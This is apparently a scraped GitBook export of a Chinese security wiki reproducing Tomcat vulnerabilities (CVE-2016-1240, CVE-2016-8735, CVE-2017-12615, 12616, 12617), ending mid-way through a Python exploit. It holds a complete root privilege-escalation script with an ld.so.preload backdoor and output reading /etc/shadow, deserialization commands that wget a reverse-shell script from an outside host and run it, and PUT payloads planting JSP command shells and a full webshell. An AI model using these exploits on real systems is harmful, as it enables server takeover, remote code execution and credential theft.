将一个字符串写入文件 file_get_contents — 将整个文件读入一个字符串 在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。 漏洞复线 在自己的服务器创建一个 ian.php \"; ?> 登录后台，通过访问构造的url，成功下载第三方源的恶意脚本文件 http://www.0-sec.org:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://你的vps:8000/ian.php 通过直接访问url，触发代码执行，成功获取网站服务器权限。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:29 "},"Web安全/Tomcat/（CVE-2016-1240）Tomcat本地提权漏洞/（CVE-2016-1240）Tomcat本地提权漏洞.html":{"url":"Web安全/Tomcat/（CVE-2016-1240）Tomcat本地提权漏洞/（CVE-2016-1240）Tomcat本地提权漏洞.html","title":"（CVE-2016-1240）Tomcat本地提权漏洞","keywords":"","body":"（CVE-2016-1240）Tomcat本地提权漏洞 一、漏洞简介 Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使 deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tocat*利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限！ 二、漏洞影响 Tomcat 8 \\ 三、复现过程 漏洞分析 Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使用deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat\\.sh。利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。 现在我们查看文件 /etc/init.d/tomcat7 操作如下： 首先我们使用 Evrething搜索xshell，选中xshell.exe运行xshell，然后连接上目标机的低权限用户tomcat7，账号是tomcat7，密码是：tomcat7。 Tomcat本地提权漏洞/media/rId25.gif) 然后执行命令whoami，可以看到，现在是tomcat7的权限，也就是低权限账户 Tomcat本地提权漏洞/media/rId26.gif) 然后执行命令vim /etc/init.d/tomcat7, 然后按Esc键,接下来输入英文状态下的字符冒号: set number,找到171行。 小提示:vim是一个文本编辑器，vim /etc/init.d/tomcat7的意思是编辑/etc/init.d/文件夹下的tomcat7文件。 Tomcat本地提权漏洞/media/rId27.gif) 其造成漏洞核心代码如下： # Run the catalina.sh script as a daemon set +e touch \"$CATALINA_PID\" \"$CATALINA_BASE\"/logs/catalina.out chown $TOMCAT6_USER \"$CATALINA_PID\" \"$CATALINA_BASE\"/logs/catalina.out 我们阅读上面的shell脚本 第一行，set +e,要知道set +e是什么意思，得先清楚set -e的含义： 使用set更改shell特性时，符号\\\"+\\\"和\\\"-\\\"的作用分别是打开和关闭指定的模式,set -e的意思是若指令传回值不等于0，则立即退出shell，而set +e的意思反之 第二行，touch是创建文件夹的意思，创建了catalina.out日志文件，前面的两个字符串定位了PID和BASE，涉及到其他变量这里不做探讨 第三行，chown是改变文件夹权限的命令，它将catalina.out日志文件的所述用户更改为低权限用户 这个脚本看似是没有什么问题的。但是从上面的脚本可以得出三点信息： 这个脚本运行时的权限必然是root权限。因为普通用户是无法使用chown命令，也就是没有更高的权限。 该脚本使用touch命令创建文件，此时存在以下：文件存在、不存在、存在为符号链接等情况，当文件为符号链接时会默认地对链接的文件进行操作。 脚本运行完毕后Tomcat服务器启动，此时catalina.out这个log文件的所属用户为tomcat，所属组为root。 综述上述，这就给漏洞利用创造了可能。 接下来我们来验证是否可以利用： 当前的用户为tomcat7。这就是说我们能够更改所属用户为tomcat7的catalina.out这个log文件的内容和属性。 更改它的属性，让他指向/etc/shadow/文件夹下，现在我们创建一个指向 /etc/shadow 的符号链接。 使用命令ln -fs /etc/shadow /var/log/tomcat7/catalina.out,这时候就可以在/etc/shadow下创建一个链接，就相当于Windows的快捷方式一样。 Tomcat本地提权漏洞/media/rId28.png) 此时我们查看文件cataline.out的内容，此时是权限不够，禁止读取cataline.out的内容的： Tomcat本地提权漏洞/media/rId29.png) 现在我们需要登陆root账户重启tomcat。登陆方法与登陆Tomcat7 用户相同，账号为：root, 密码为：123456 。重启Tomcat的命令为： service tomcat7 restart 重启成功之后我们再次使用低权限用户读取cataline.out的内容：使用命令 head /var/log/tomcat6/catalina.out 使用head命令可以输出文件前十行的内容，而cat命令则是预览文件的全部内容。 Tomcat本地提权漏洞/media/rId30.gif) 原理:当Tomcat服务重启时，系统默认重新加载/var/log/tomcat6/catalina.out脚本，由于此时tomcat的日志文件指向了/etc/shadow文件; 而该文件就是我们之前创建的链接文件，而链接文件属于Tomcat7这个低权限用户，因此，我们就可以查看其中内容了。 漏洞复现 本步将使用poc根据Tomcat7漏洞进行提权 poc #!/bin/bash # # Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit # # CVE-2016-1240 # # Discovered and coded by: # # Dawid Golunski # http://legalhackers.com # # This exploit targets Tomcat (versions 6, 7 and 8) packaging on # Debian-based distros including Debian, Ubuntu etc. # It allows attackers with a tomcat shell (e.g. obtained remotely through a # vulnerable java webapp, or locally via weak permissions on webapps in the # Tomcat webroot directories etc.) to escalate their privileges to root. # # Usage: # ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred] # # The exploit can used in two ways: # # -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly # gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. # It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up # a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.) # # -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to # /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. # Attackers can come back at a later time and check on the /etc/default/locale file. Upon a # Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can # then add arbitrary commands to the file which will be executed with root privileges by # the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default # Ubuntu/Debian Tomcat installations). # # See full advisory for details at: # http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html # # Disclaimer: # For testing purposes only. Do no harm. # BACKDOORSH=\"/bin/bash\" BACKDOORPATH=\"/tmp/tomcatrootsh\" PRIVESCLIB=\"/tmp/privesclib.so\" PRIVESCSRC=\"/tmp/privesclib.c\" SUIDBIN=\"/usr/bin/sudo\" function cleanexit { # Cleanup echo -e \"\\n[+] Cleaning up...\" rm -f $PRIVESCSRC rm -f $PRIVESCLIB rm -f $TOMCATLOG touch $TOMCATLOG if [ -f /etc/ld.so.preload ]; then echo -n > /etc/ld.so.preload 2>/dev/null fi echo -e \"\\n[+] Job done. Exiting with code $1 \\n\" exit $1 } function ctrl_c() { echo -e \"\\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.\" cleanexit 0 } #intro echo -e \"\\033[94m \\nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\\nCVE-2016-1240\\n\" echo -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttp://legalhackers.com \\033[0m\" # Args if [ $# -lt 1 ]; then echo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_catalina.out [-deferred]\\n\" exit 3 fi if [ \"$2\" = \"-deferred\" ]; then mode=\"deferred\" else mode=\"active\" fi # Priv check echo -e \"\\n[+] Starting the exploit in [\\033[94m$mode\\033[0m] mode with the following privileges: \\n`id`\" id | grep -q tomcat if [ $? -ne 0 ]; then echo -e \"\\n[!] You need to execute the exploit as tomcat user! Exiting.\\n\" exit 3 fi # Set target paths TOMCATLOG=\"$1\" if [ ! -f $TOMCATLOG ]; then echo -e \"\\n[!] The specified Tomcat catalina.out log ($TOMCATLOG) doesn't exist. Try again.\\n\" exit 3 fi echo -e \"\\n[+] Target Tomcat log file set to $TOMCATLOG\" # [ Deferred exploitation ] # Symlink the log file to /etc/default/locale file which gets executed daily on default # tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am. # Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been # restarted and file owner gets changed. if [ \"$mode\" = \"deferred\" ]; then rm -f $TOMCATLOG && ln -s /etc/default/locale $TOMCATLOG if [ $? -ne 0 ]; then echo -e \"\\n[!] Couldn't remove the $TOMCATLOG file or create a symlink.\" cleanexit 3 fi echo -e \"\\n[+] Symlink created at: \\n`ls -l $TOMCATLOG`\" echo -e \"\\n[+] The current owner of the file is: \\n`ls -l /etc/default/locale`\" echo -ne \"\\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot\" echo -ne \"\\n you'll be able to add arbitrary commands to the file which will get executed with root privileges\" echo -ne \"\\n at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can't wait ;) \\n\\n\" exit 0 fi # [ Active exploitation ] trap ctrl_c INT # Compile privesc preload library echo -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\" cat $PRIVESCSRC #define _GNU_SOURCE #include #include #include #include uid_t geteuid(void) { static uid_t (*old_geteuid)(); old_geteuid = dlsym(RTLD_NEXT, \"geteuid\"); if ( old_geteuid() == 0 ) { chown(\"$BACKDOORPATH\", 0, 0); chmod(\"$BACKDOORPATH\", 04777); unlink(\"/etc/ld.so.preload\"); } return old_geteuid(); } _solibeof_ gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl if [ $? -ne 0 ]; then echo -e \"\\n[!] Failed to compile the privesc lib $PRIVESCSRC.\" cleanexit 2; fi # Prepare backdoor shell cp $BACKDOORSH $BACKDOORPATH echo -e \"\\n[+] Backdoor/low-priv shell installed at: \\n`ls -l $BACKDOORPATH`\" # Safety check if [ -f /etc/ld.so.preload ]; then echo -e \"\\n[!] /etc/ld.so.preload already exists. Exiting for safety.\" cleanexit 2 fi # Symlink the log file to ld.so.preload rm -f $TOMCATLOG && ln -s /etc/ld.so.preload $TOMCATLOG if [ $? -ne 0 ]; then echo -e \"\\n[!] Couldn't remove the $TOMCATLOG file or create a symlink.\" cleanexit 3 fi echo -e \"\\n[+] Symlink created at: \\n`ls -l $TOMCATLOG`\" # Wait for Tomcat to re-open the logs echo -ne \"\\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...\" echo -e \"\\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;) \" while :; do sleep 0.1 if [ -f /etc/ld.so.preload ]; then echo $PRIVESCLIB > /etc/ld.so.preload break; fi done # /etc/ld.so.preload file should be owned by tomcat user at this point # Inject the privesc.so shared library to escalate privileges echo $PRIVESCLIB > /etc/ld.so.preload echo -e \"\\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \\n`ls -l /etc/ld.so.preload`\" echo -e \"\\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload\" echo -e \"\\n[+] The /etc/ld.so.preload file now contains: \\n`cat /etc/ld.so.preload`\" # Escalating privileges via the SUID binary (e.g. /usr/bin/sudo) echo -e \"\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!\" sudo --help 2>/dev/null >/dev/null # Check for the rootshell ls -l $BACKDOORPATH | grep rws | grep -q root if [ $? -eq 0 ]; then echo -e \"\\n[+] Rootshell got assigned root SUID perms at: \\n`ls -l $BACKDOORPATH`\" echo -e \"\\n\\033[94mPlease tell me you're seeing this too ;) \\033[0m\" else echo -e \"\\n[!] Failed to get root\" cleanexit 2 fi # Execute the rootshell echo -e \"\\n[+] Executing the rootshell $BACKDOORPATH now! \\n\" $BACKDOORPATH -p -c \"rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB\" $BACKDOORPATH -p # Job done. cleanexit 0 poc运行示例： tomcat7@ubuntu:/tmp$ id uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7) tomcat7@ubuntu:/tmp$ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04 LTS Release: 16.04 Codename: xenial tomcat7@ubuntu:/tmp$ dpkg -l | grep tomcat ii libtomcat7-java 7.0.68-1ubuntu0.1 all Servlet and JSP engine -- core libraries ii tomcat7 7.0.68-1ubuntu0.1 all Servlet and JSP engine ii tomcat7-common 7.0.68-1ubuntu0.1 all Servlet and JSP engine -- common files tomcat7@ubuntu:/tmp$ ./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit CVE-2016-1240 Discovered and coded by: Dawid Golunski http://legalhackers.com [+] Starting the exploit in [active] mode with the following privileges: uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7) [+] Target Tomcat log file set to /var/log/tomcat7/catalina.out [+] Compiling the privesc shared library (/tmp/privesclib.c) [+] Backdoor/low-priv shell installed at: -rwxr-xr-x 1 tomcat7 tomcat7 1037464 Sep 30 22:27 /tmp/tomcatrootsh [+] Symlink created at: lrwxrwxrwx 1 tomcat7 tomcat7 18 Sep 30 22:27 /var/log/tomcat7/catalina.out -> /etc/ld.so.preload [+] Waiting for Tomcat to re-open the logs/Tomcat service restart... You could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;) [+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: -rw-r--r-- 1 tomcat7 root 19 Sep 30 22:28 /etc/ld.so.preload [+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload [+] The /etc/ld.so.preload file now contains: /tmp/privesclib.so [+] Escalating privileges via the /usr/bin/sudo SUID binary to get root! [+] Rootshell got assigned root SUID perms at: -rwsrwxrwx 1 root root 1037464 Sep 30 22:27 /tmp/tomcatrootsh Please tell me you're seeing this too ;) [+] Executing the rootshell /tmp/tomcatrootsh now! tomcatrootsh-4.3# id uid=110(tomcat7) gid=118(tomcat7) euid=0(root) groups=118(tomcat7) tomcatrootsh-4.3# whoami root tomcatrootsh-4.3# head -n3 /etc/shadow root:$6$oaf[cut]:16912:0:99999:7::: daemon:*:16912:0:99999:7::: bin:*:16912:0:99999:7::: tomcatrootsh-4.3# exit exit 首先我们下载poc文件，然后执行命令cd /tmp进入目录,然后编辑文件vim poc.sh。将桌面的poc.sh使用Notepad++打开，将文件内容粘贴进去。然后按键盘Esc键，再输入:wq，之后按 Enter 键将文件保存。 如果无法写入文件，使用命令 chmod 755 poc.sh 执行命令后，再次重复上一步即可，chmod的意思是改变文件的权限，775是什么权限呢？第一个数字代表文件所属者的权限，第二个数字代表文件所属者所在组的权限，第三个数字代表其它用户的权限，7=4+2+1 4：执行时设置用户ID，用于授权给基于文件属主的进程，而不是给创建此进程的用户。 2：执行时设置用户组ID，用于授权给基于文件所在组的进程，而不是基于创建此进程的用户。 1：设置粘着位。 Tomcat本地提权漏洞/media/rId34.gif) 这时，poc文件就已经构造好了，接下来运行脚本运行命令为： ./poc.sh /var/log/tomcat7/catalina.out 运行之后，会出现卡顿现象，这时候我们切换到root用户，重新启动Tomcat7，这时候使用命令whoami查看当前用户，这时候已经是 root 用户了，这时候就提权成功了 Tomcat本地提权漏洞/media/rId35.gif) 可以看到，命令提示符的开头为tomcat低权限用户，而我们执行whoami命令的时候，显示的权限却是root，这样就成功的提权了。 参考链接 https://www.jianshu.com/p/94e4feac245f Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:40 "},"Web安全/Tomcat/（CVE-2016-8735）Tomcat 反序列化漏洞/（CVE-2016-8735）Tomcat 反序列化漏洞.html":{"url":"Web安全/Tomcat/（CVE-2016-8735）Tomcat 反序列化漏洞/（CVE-2016-8735）Tomcat 反序列化漏洞.html","title":"（CVE-2016-8735）Tomcat 反序列化漏洞","keywords":"","body":"（CVE-2016-8735）Tomcat 反序列化漏洞 一、漏洞简介 该漏洞与之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致的远程代码执行。 该漏洞所造成的最根本原因是Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法。 二、漏洞影响 ApacheTomcat 9.0.0.M1 到9.0.0.M11 ApacheTomcat 8.5.0 到8.5.6 ApacheTomcat 8.0.0.RC1 到8.0.38 ApacheTomcat 7.0.0 到7.0.72 ApacheTomcat 6.0.0 到6.0.47 三、复现过程 漏洞利用条件： 外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。 构造命令 Win ping一次命令： ping -n 1 qjkpla.ceye.io Linux ping 一次命令： ping -c 1 qjkpla.ceye.io 利用Ceye回显看是否存在漏洞: java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口 Groovy1 \"ping -c Groovy1.test.qjkpla.ceye.io\" Tomcat反序列化漏洞/media/rId26.png) DNS回显能返回数据，说明执行了Ping命令，也就是说漏洞存在 Tomcat反序列化漏洞/media/rId27.png) 直接NC监听服务： nc -l -vv 12555 Tomcat反序列化漏洞/media/rId28.png) 然后构造命令：下载我们的反弹脚本:(之前用bash命令反弹没有成功所以使用Python脚本进行反弹) java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口 Groovy1 \"wget http://rinige.com/back.py -O /tmp/x.py\" 执行完此命令继续构造命令，去执行刚在wget的脚本 java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口Groovy1 \"python /tmp/x.py 反弹主机地址 反弹端口\" Tomcat反序列化漏洞/media/rId29.png) 成功反弹： Tomcat反序列化漏洞/media/rId30.png) image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:43 "},"Web安全/Tomcat/（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞/（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞.html":{"url":"Web安全/Tomcat/（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞/（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞.html","title":"（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞","keywords":"","body":"（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞 一、漏洞简介 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。 二、漏洞影响 Apache Tomcat 7.0.0 -- 7.0.81 三、复现过程 漏洞复现 1.环境搭建： （1)先安装jdk。（因为Tomcat需要java环境支持） jdk8下载地址 http://www.liangchan.net/soft/download.asp?softid=9366&downid=8&id=9430 12 (2)双击jdk安装包，一直下一步安装即可(默认是会配置环境变量的) (3)安装完可以自己测试一下： TomcatPUT方法任意文件写入漏洞/media/rId27.png) (4)安装Tomcat Tomcat 7.0.79 安装包下载地址：http://www.liangchan.net/soft/download.asp?softid=9366&downid=8&id=9430 12 (5)双击安装包，一直下一步默认即可 (6)安装完成后启动服务，访问http://127.0.0.1:8080 验证一下是否成功 (7)Tomcat服务器配置。打开Tomcat安装目录下的 /conf/web.xml 添加如下配置： TomcatPUT方法任意文件写入漏洞/media/rId29.png) 漏洞利用 上传姿势一： 参考思路:微软MSDN上关于NTFS Streams的一段资料https://msdn.microsoft.com/en-us/library/dn393272.aspx 大概意思: NTFS卷上的所有文件至少包含一个流 主流 - 这是存储数据的普通可查看文件。流的全名是以下形式。 Copy to clipboard：： 默认数据流没有名称。也就是说，名为sample.txt的文件的默认流的完全限定名称是ample.txt :: $ DATA，因为sample.txt是文件的名称，$ DATA&是流类型。 用户可以在文件中创建命名流，并将$ DATA创建为合法名称。这意味着对于此流，全名是sample.txt：$ DATA：$ DATA。如果用户创建了名为bar的命名流，则其全名为sample.txt：bar：$ DATA。文件名的任何合法字符对于流名称（包括空格）都是合法的。 对于目录，没有默认数据流，但有一个默认目录流。目录是流类型$ INDEX_ALLOCATION。$ INDEX_ALLOCATION类型（目录流）的默认流名称是$ I30。（这与$ DATA流的默认流名称形成对比，后者具有空的流名称。）以下是等效的： Copy to clipboardDir C：\\ Users Dir C：\\ Users：$ I30：$ INDEX_ALLOCATION Dir C：\\ Users :: $ INDEX_ALLOCATION 虽然目录没有默认数据流，但它们可以具有命名数据流。这些备用数据流通常不可见，但可以使用DIR命令的/ R选项从命令行观察。 payload: PUT /shell.jsp::$DATA HTTP/1.1 Host: 172.26.1.8:8080 Content-Length: 662 \"+excuteCmd(request.getParameter(\"cmd\"))+\"\");}else{out.println(\":-)\");}%> 我们利用burpsuite来发送我们的payload TomcatPUT方法任意文件写入漏洞/media/rId34.png) 可以看到返回响应码201，说明我们上传成功了。我们访问我们jsp脚本试试： TomcatPUT方法任意文件写入漏洞/media/rId35.png) 看到可以命令执行(我们上传的payload是命令执行的脚本)，我们也可以上传一个jsp的webshell 上传姿势二： 我们知道servlet在识别1.jsp/时会把它当作非jsp文件交给DefaultServlet 来处理，而后续保存文件的时候，文件名不接受/字符，故而忽略掉 payload：(这次我们演示上传一个webshell) PUT /webshell.jsp/ HTTP/1.1 Host: 172.26.1.8:8080 Content-Length: 6239 [email protected]/* */ import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%> 4) { c.setCatalog(x[4]); } return c; } } void AA(StringBuffer sb) throws Exception { File k = new File(\"\"); File r[] = k.listRoots(); for (int i = 0; i \" + \"|\").getBytes(), 0, 3); while ((n = is.read(b, 0, 512)) != -1) { os.write(b, 0, n); } os.write((\"|\" + \"5?x[5]:x[4]:null, \"%\", new String[]{\"TABLE\"}); while (r.next()) { sb.append(r.getString(\"TABLE_NAME\") + \"\\t|\\t\\r\\n\"); } r.close(); c.close(); } void PP(String s, StringBuffer sb) throws Exception { String[] x = s.trim().split(\"\\r\\n\"); Connection c = GC(s); Statement m = c.createStatement(1005, 1007); ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]); ResultSetMetaData d = r.getMetaData(); for (int i = 1; i \" + \"|\"); String s = request.getSession().getServletContext().getRealPath(\"/\"); if (Z.equals(\"A\")) { sb.append(s + \"\\t\"); if (!s.substring(0, 1).equals(\"/\")) { AA(sb); } } else if (Z.equals(\"B\")) { BB(z1, sb); } else if (Z.equals(\"C\")) { String l = \"\"; BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1)))); while ((l = br.readLine()) != null) { sb.append(l + \"\\r\\n\"); } br.close(); } else if (Z.equals(\"D\")) { BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1)))); bw.write(z2); bw.close(); sb.append(\"1\"); } else if (Z.equals(\"E\")) { EE(z1); sb.append(\"1\"); } else if (Z.equals(\"F\")) { FF(z1, response); } else if (Z.equals(\"G\")) { GG(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"H\")) { HH(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"I\")) { II(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"J\")) { JJ(z1); sb.append(\"1\"); } else if (Z.equals(\"K\")) { KK(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"L\")) { LL(z1, z2); sb.append(\"1\"); } else if (Z.equals(\"M\")) { String[] c = { z1.substring(2), z1.substring(0, 2), z2 }; Process p = Runtime.getRuntime().exec(c); MM(p.getInputStream(), sb); MM(p.getErrorStream(), sb); } else if (Z.equals(\"N\")) { NN(z1, sb); } else if (Z.equals(\"O\")) { OO(z1, sb); } else if (Z.equals(\"P\")) { PP(z1, sb); } else if (Z.equals(\"Q\")) { QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z2.length()):s.replaceAll(\"\\\\\\\\\", \"/\")+\"images/\"); } } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } sb.append(\"|\" + \" 我们还是利用burpsuite发送我们构造的payload： TomcatPUT方法任意文件写入漏洞/media/rId37.png) 我们可以看到响应码为201，说明成功创建，我们用菜刀连接看一下： TomcatPUT方法任意文件写入漏洞/media/rId38.png) 验证脚本 https://github.com/ianxtianxt/CVE-2017-12615 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:45 "},"Web安全/Tomcat/（CVE-2017-12616）Tomcat 信息泄露/（CVE-2017-12616）Tomcat 信息泄露.html":{"url":"Web安全/Tomcat/（CVE-2017-12616）Tomcat 信息泄露/（CVE-2017-12616）Tomcat 信息泄露.html","title":"（CVE-2017-12616）Tomcat 信息泄露","keywords":"","body":"（CVE-2017-12616）Tomcat 信息泄露 一、漏洞简介 CVE-2017-12616(信息泄露):允许未经身份验证的远程攻击者查看敏感信息。如果tomcat开启VirtualDirContext有可能绕过安全限制访问服务器上的JSP文件源码。漏洞触发的先决条件是需要在conf/server.xml配置VirtualDirContex参数，默认情况下tomcat7并不会对该参数进行配置。 那么为什么要配置一个这样的虚拟目录呢？ 通过VirtualDirContext,允许在单独的一个webapp应用下对外暴露出多个文件系统的目录。在实际开发中，为了避免拷贝静态资源文件如(images等)至webapp目录下，tomcat推荐的做法是在server.xml配置文件中建立虚拟子目录。 在开启了这个配置之后，可以通过windows目录下的文件的解析问题，从而暴露在在目录中的源码。 二、漏洞影响 Apache Tomcat 7.0.0 - 7.0.80 三、复现过程 漏洞调试 在本地搭建一个系统环境，目录结果如下：在D:\\testtomcat2的目录下面的文件结构如下: D:. ├─img │ 1.jpg │ ├─src │ HelloWorld.java │ ├─target └─web │ index.jsp │ └─WEB-INF web.xml 在tomcat中的conf/server.xml下的``标签下面增加如下的配置: 从配置可以发现，我创建了2个虚拟目录。分别为images和tmp，分别映射到本地的D:/testtomcat2https://wiki.0-sec.org/img和D:/testtomcat2/web。大家在进行测试的时候，可以根据自己的目录自行参照修改。 部署完毕之后，在浏览器中访问localhost:8080/site/images/1.jpg Tomcat信息泄露/media/rId25.png) 顺利地出现了1.jpg，说明部署正确。 这个漏洞的触发，同样会使用到tomcat中因为文件后缀的解析的问题。和12615是一样的，只有后缀是jsp和jspx由JSPservlet处理，其他都是由DefaultServlet处理。在12615中配合PUT方法，可以通过上传test.jsp%20、test.jsp/、test.jsp::$DATA的方式上传任意的问价，包括webshell。但是在本例中，只能通过test.jsp%20和test.jsp::$DATA获得源代码，无法通过test.jsp/获取源代码。以下就是演示的结果: Tomcat信息泄露/media/rId26.jpg) 而访问http://localhost:8080/site/tmp/index.jsp/会显示404, Tomcat信息泄露/media/rId27.jpg) 整个漏洞的分析过程和12615是一样的，下面就为什么无法使用test.jsp/无法获取源代码进行说明。当访问http://localhost:8080/site/tmp/index.jsp/时，是由Tomcat中的DefaultServelt::doGet来处理。 @Override protected void doGet(HttpServletRequest request,HttpServletResponse response) throws IOException, ServletException { // Serve the requested resource, including the data content serveResource(request, response, true); } 追踪进入到serveResource，其中的关键代码如下： protected void serveResource(HttpServletRequest request,HttpServletResponse response,boolean content) throws IOException, ServletException { boolean serveContent = content; // Identify the requested resource path String path = getRelativePath(request, true); CacheEntry cacheEntry = resources.lookupCache(path); // If the resource is not a collection, and the resource path // ends with \"/\" or \"\\\", return NOT FOUND if (cacheEntry.context == null) { if (path.endsWith(\"/\") || (path.endsWith(\"\\\\\"))) { // Check if we're included so we can return the appropriate // missing resource name in the error String requestUri = (String) request.getAttribute( RequestDispatcher.INCLUDE_REQUEST_URI); if (requestUri == null) { requestUri = request.getRequestURI(); } response.sendError(HttpServletResponse.SC_NOT_FOUND, requestUri); return; } } } 所以当cacheEntry.context == null而且path.endsWith(\"/\") || (path.endsWith(\"\\\\\"))，则直接向客户端返回404,所以采用test.jsp/方式并不能够成功触发获取服务端漏洞的JSP代码。 所以这也就是为什么通过test.jsp/获取源代码的原因了。 参考链接 https://blog.spoock.com/2017/09/25/tomcat-cve-2017-12615-12616/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:47 "},"Web安全/Tomcat/（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass/（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass.html":{"url":"Web安全/Tomcat/（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass/（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass.html","title":"（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass","keywords":"","body":"（CVE-2017-12617）Tomcat RCE via JSP Upload Bypass 一、漏洞简介 Apache Tomcat版本9.0.0.M1至9.0.0、8.5.0至8.5.22、8.0.0.RC1至8.0.46和7.0.0至7.0.81且启用HTTP PUT时（例如，通过设置只读如果将Default servlet的初始化参数设置为false，则可以通过特制请求将JSP文件上载到服务器。然后可以请求此JSP，并且服务器将执行其中包含的所有代码。 二、漏洞影响 Apache Tomcat版本9.0.0.M1至9.0.0Apache Tomcat版本8.5.0至8.5.22Apache Tomcat版本8.0.0.RC1至8.0.46Apache Tomcat版本7.0.0至7.0.81 三、复现过程 msf自带的有利用脚本，懒省事可以直接用msfTomcatRCEviaJSPUploadBypass/media/rId24.png) poc useage ./cve-2017-12617.py -u http://www.0-sec.org ./cve-2017-12617.py --url http://www.0-sec.org ./cve-2017-12617.py -u http://www.0-sec.org -p pwn ./cve-2017-12617.py --url http://www.0-sec.org -pwn pwn ./cve-2017-12617.py -l hotsts.txt ./cve-2017-12617.py --list hosts.txt #!/usr/bin/python import requests import re import signal from optparse import OptionParser class bcolors: HEADER = '\\033[95m' OKBLUE = '\\033[94m' OKGREEN = '\\033[92m' WARNING = '\\033[93m' FAIL = '\\033[91m' ENDC = '\\033[0m' BOLD = '\\033[1m' UNDERLINE = '\\033[4m' banner=\"\"\" _______ ________ ___ ___ __ ______ __ ___ __ __ ______ / ____\\ \\ / 